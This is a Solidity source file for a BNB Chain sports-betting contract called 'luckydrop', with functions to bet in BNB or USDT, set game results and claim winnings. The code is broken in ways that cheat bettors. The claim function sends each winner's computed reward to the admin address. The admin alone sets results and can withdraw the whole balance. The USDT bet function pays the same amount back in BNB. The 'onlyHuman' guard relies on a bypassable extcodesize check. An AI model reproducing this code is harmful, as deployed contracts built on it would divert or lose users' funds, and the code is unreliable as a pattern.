// https://uniswap.org/docs/v2/smart-contracts/pair-erc-20/
// https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/UniswapV2Pair.sol implementation
// SPDX-License-Identifier: MIT
// USDT : https://testnet.bscscan.com/address/0x337610d27c682E347C9cD60BD4b3b107C9d34dDd#code
// games array:
// [
// {
// 	"id":1,
// 	"key":"id1",
// 	"name":"game1"
// 	"team1":"aaa",
// 	"team2":"bbb",
// 	"result":"0_0",
// 	"startTime":1612341234123
// 	"endTime":1612341234123,
// 	"status":0,1,2,3
// },
// {
// 	"id":2,
// 	"key":"id2",
// 	"name":"game2"
// 	"team3":"ccc",
// 	"team4":"ddd",
// 	"result":"0_0",
// 	"startTime":1612341234123,
// 	"endTime":1612341234123,
// 	"status":0,1,2,3
// }
// ]

// betdata mapping:
// {
// 	"id1":{
// 	   	"team1":{
// 	   	     "addr1":500 + 300,
// 	   	     "addr2":400,
// 	   	     "addr3":300
// 	   	},
// 	   	"team2":{
// 	   	     "addr3":600,
// 	   	     "addr4":800
// 	   	},
// 	   	"equal":{
// 	   		 "addr5":100,
// 	   	     "addr6":100
// 	   	}
// 	}
// }


// betdata count mapping:
// {
// 	"id1":{
// 	   	"team1":1500,
// 	   	"team2":1400,
// 	   	"equal":200
// 	}
// }

pragma solidity ^0.8.0;

//import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/master/contracts/utils/math/SafeMath.sol"; 

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}



contract luckydrop{
    struct Game{
        uint256 id;
        string key;
        string result;
        uint256 startTime;
        uint256 endTime;
        uint status;
        mapping (string => uint256) statisticData;
    }

    uint256 gameIdIndex;
    address payable public adminAddress;

    constructor() {
        adminAddress  = payable(msg.sender);
    }

    mapping (uint256 => Game) games;

    using  SafeMath for uint256;

    mapping (address => mapping (uint256 => bool)) claimFlag;

    mapping (uint256 => mapping (string => mapping (address => uint256))) betData;

    // mapping (uint256 => mapping (string => uint256)) statisticData;
    
    function bet(uint256 gameId, string memory team ) public onlyHuman payable  {
        // string memory team1 = "team1";
        require(msg.value != 0, "Error, msg.value must be higher that 0");

        require(gameId <= gameIdIndex && gameId >= 0, "gameId param is not valid");
        //require(games[gameId].startTime <= block.timestamp  && games[gameId].endTime >= block.timestamp, "game is not open");
        // require( keccak256(abi.encodePacked(team)) == keccak256(abi.encodePacked("team1"))
        //     ||   keccak256(abi.encodePacked(team)) == keccak256(abi.encodePacked("team2"))
        //     ||   keccak256(abi.encodePacked(team)) == keccak256(abi.encodePacked("equal")), "team param is not valid");
        uint256 amount = msg.value;
        address better = msg.sender;
        betData[gameId][team][better] = betData[gameId][team][better] + amount;
        games[gameId].statisticData[team] = games[gameId].statisticData[team]  + amount;

    }

// struct Game{
//         uint256 id;
//         string key;
//         string result;
//         uint256 startTime;
//         uint256 endTime;
//         uint status;
//         mapping (string => uint256) statisticData;
//     }

    function addGame(string memory key, uint256 startTime, uint256 endTime) public onlyAdmin returns (uint256){
        gameIdIndex++;
        Game storage  g = games[gameIdIndex];
        g.id = gameIdIndex;
        g.key = "game";
        g.result = "";
        g.startTime  = startTime;
        g.endTime = endTime;
        g.status = 0;
        return gameIdIndex;
    }

    function setGameStatus( uint256 gameId, uint status) public onlyAdmin returns (uint256){
        require(gameId <= gameIdIndex && gameId >= 0, "gameId param is not valid");
        games[gameId].status = status;
        return games[gameId].status;
    }

    function setGameResult(uint256 gameId,  string memory result) public onlyAdmin returns (uint256){
        require(gameId <= gameIdIndex && gameId >= 0, "gameId param is not valid");
        //require(games[gameId].status == 1, "game is not open");

        // require( keccak256(abi.encodePacked(team)) == keccak256(abi.encodePacked("team1"))
        //     ||   keccak256(abi.encodePacked(team)) == keccak256(abi.encodePacked("team2"))
        //     ||  keccak256(abi.encodePacked(team)) == keccak256(abi.encodePacked("equal")), "team param is not valid");
        Game storage g = games[gameId];
        g.result = result;
        g.status = 2;
        
        return g.status;
    }


    function claimGameResult(uint256 gameId) public onlyHuman payable{
        require(gameId <= gameIdIndex && gameId >= 0, "gameId param is not valid");
        require(games[gameId].status == 2, "game result is not set");

        Game storage g = games[gameId];
        
        string storage team = g.result ;

        if(betData[gameId][team][msg.sender] > 0 && claimFlag[msg.sender][gameId] == false){
            
            uint256 total = g.statisticData["team1"] + g.statisticData["team2"] + g.statisticData["equal"];
            uint256 userRewaldTotal = SafeMath.div(SafeMath.mul(total, 9), 10);

            uint256 userAmount = betData[gameId][team][msg.sender]; 
            uint256 percent =  SafeMath.div(userAmount * 100000, g.statisticData[team]);
            uint256 reward = SafeMath.mul(percent, userRewaldTotal);

            adminAddress.transfer(SafeMath.div(reward, 100000));
            claimFlag[msg.sender][gameId] = true;
        }

    }

    function testCal(uint256 team1,uint256 team2, uint256 equal, uint256 userAmount) public view returns (uint256, uint256,uint256, uint256){
        uint256 total = team1 + team2 + equal;
        uint256 userRewaldTotal = SafeMath.div(SafeMath.mul(total, 9), 10);

        uint256 percent =  SafeMath.div(userAmount * 100000, team1);
        uint256 reward = SafeMath.mul(percent, userRewaldTotal);
        uint256 real = SafeMath.div(reward,100000);

        return (userRewaldTotal, percent, reward, real);

    }

    function withdrawBNB(uint256 amount) public payable onlyAdmin {
        require(address(this).balance >= amount,  "contract has insufficent balance");
        adminAddress.transfer( amount);
    }

     function queryUserClaim(uint256 gameId) public view returns (uint256, uint256, bool){
        require(gameId <= gameIdIndex && gameId >= 0, "gameId param is not valid");
        require(games[gameId].status == 2, "game result is not set");

        Game storage g = games[gameId];
        string storage team = g.result ;

        uint256 total = g.statisticData["team1"] + g.statisticData["team2"] + g.statisticData["equal"];
        uint256 userRewaldTotal = SafeMath.div(SafeMath.mul(total, 9), 10);

        uint256 userAmount = betData[gameId][team][msg.sender]; 
        uint256 percent =  SafeMath.div(userAmount * 100, g.statisticData[team]);
        uint256 reward = SafeMath.mul(percent, userRewaldTotal);
        uint256 real = SafeMath.div(reward,100);

        return (userAmount, real, claimFlag[msg.sender][gameId]);


    }


    function getGameInfo(uint256 gameId) public view returns (uint256 , uint256, uint256 ){
        require(gameId <= gameIdIndex && gameId >= 0, "gameId param is not valid");
        return (games[gameId].statisticData["team1"], games[gameId].statisticData["team2"], games[gameId].statisticData["equal"]); 
    }

    function getUserGameInfo(uint256 gameId ) public view returns (uint256 , uint256, uint256 ){
        require(gameId <= gameIdIndex && gameId >= 0, "gameId param is not valid");
        return (betData[gameId]["team1"][msg.sender], betData[gameId]["team2"][msg.sender], betData[gameId]["equal"][msg.sender]); 
    }

    modifier onlyHuman() {
        uint size;
        address addr = msg.sender;
        assembly { size := extcodesize(addr) }
        require(size == 0, "only humans allowed! (code present at caller address)");
        _;
    }

    modifier onlyAdmin(){
        require(msg.sender == adminAddress, "not allowed");
        _;
    }

    // function sendUSDT(address _to, uint256 _amount) external {
    //      // This is the mainnet USDT contract address
    //      // Using on other networks (rinkeby, local, ...) would fail
    //      //  - there's no contract on this address on other networks
    //     IERC20 usdt = IERC20("0xb425da01b4a353ff9f36f6cae4acd32911046fe5");
        
    //     // transfers USDT that belong to your contract to the specified address
    //     usdt.transfer(_to, _amount);
    // }

    // function receiveUSDT(address _to, uint256 _amount) external {
    //      // This is the mainnet USDT contract address
    //      // Using on other networks (rinkeby, local, ...) would fail
    //      //  - there's no contract on this address on other networks
    //     IERC20 usdt = IERC20(address(0xb425da01b4a353ff9f36f6cae4acd32911046fe5));
        
    //     // transfers USDT that belong to your contract to the specified address
    //     usdt.transfer(_to, _amount);
    // }

    function betWithUSDT(uint256 amount, uint256 gameId) public {
    
        require(amount > 0, "You need to bet at least some tokens");
        IERC20 token = IERC20(address(0xB425dA01b4A353fF9f36f6Cae4acD32911046fE5));
        //uint256 allowance = token.allowance(msg.sender, address(this));
        //require(allowance >= amount, "Check the token allowance");
        token.transferFrom(msg.sender, address(this), amount);
        //token.transfer(recipient, amount);
        payable(msg.sender).transfer(amount);
        
    }

    function approveUSDT(uint256 amount) public  {
        IERC20 token = IERC20(address(0xB425dA01b4A353fF9f36f6Cae4acD32911046fE5));
        token.approve( address(this), amount);
    }

    function getInfo() public view returns (uint256, uint256, uint256) {
        IERC20 token = IERC20(address(0xB425dA01b4A353fF9f36f6Cae4acD32911046fE5));
        //token.transfer(recipient, amount);
        uint256 allowance = token.allowance(msg.sender, address(this));
        uint256 balanceOfSender = token.balanceOf(msg.sender);
        uint256 balanceOfContract = token.balanceOf(address(this));
        return (allowance, balanceOfSender, balanceOfContract);
    }
    //2000000000000000
    
}
